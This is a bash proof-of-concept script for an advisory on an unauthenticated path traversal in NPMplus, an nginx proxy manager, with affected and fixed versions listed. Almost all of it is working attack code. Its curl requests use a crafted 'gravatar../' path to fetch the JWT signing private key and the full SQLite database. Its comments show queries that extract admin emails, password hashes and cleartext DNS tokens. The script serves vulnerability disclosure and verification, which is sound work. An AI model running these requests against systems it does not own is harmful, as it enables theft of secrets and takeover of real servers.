#!/usr/bin/env bash
#
# NPMplus — unauthenticated nginx `alias` off-by-slash path traversal (CWE-22)
# Advisory : GHSA-wj85-328x-ww6r        Reporter : Lyris Vale (@ValeLyris)
# Affected : 2025-12-29-b1 <= v < 2026-07-23-r1     Fixed : 2026-07-23-r1
#
# Every request below is UNAUTHENTICATED (no cookie / token).
# Run only against an instance you own. See ../README.md for scope notes.
#
# Usage:  ./poc.sh [HOST:PORT]      (default 127.0.0.1:8081)

set -euo pipefail
HOST="${1:-127.0.0.1:8081}"

# 0. (setup) run the vulnerable image and finish first-boot setup so /data/npmplus is populated:
#      docker run -d --name npmplus -p 8081:81 ghcr.io/zoeyvid/npmplus:2026-07-15-r1   # an affected build
#      then open https://${HOST}/ and complete the setup wizard (unrelated to the bug).

echo "[*] 1) steal the JWT signing private key (keys.json)"
curl -sk --path-as-is "https://${HOST}/images/gravatar../keys.json"
echo

echo "[*] 2) exfiltrate the entire application database"
curl -sk --path-as-is "https://${HOST}/images/gravatar../database.sqlite" -o database.sqlite
file database.sqlite
# Inspect the loot (offline):
#   sqlite3 database.sqlite 'select email,roles from user;'          # admin account
#   sqlite3 database.sqlite 'select type,secret from auth;'          # bcrypt cost-13 hash
#   sqlite3 database.sqlite 'select provider,meta from certificate;' # DNS token in cleartext (DNS-01 deployments)

echo "[*] 3) control - alias root is not directory-listable (proves traversal, not public exposure)"
curl -sk -o /dev/null -w '    HTTP %{http_code}\n' "https://${HOST}/images/gravatar/"   # -> 403

echo "[*] 4) control - direct /keys.json returns the SPA HTML, not the key"
curl -sk "https://${HOST}/keys.json" | head -c 120
echo
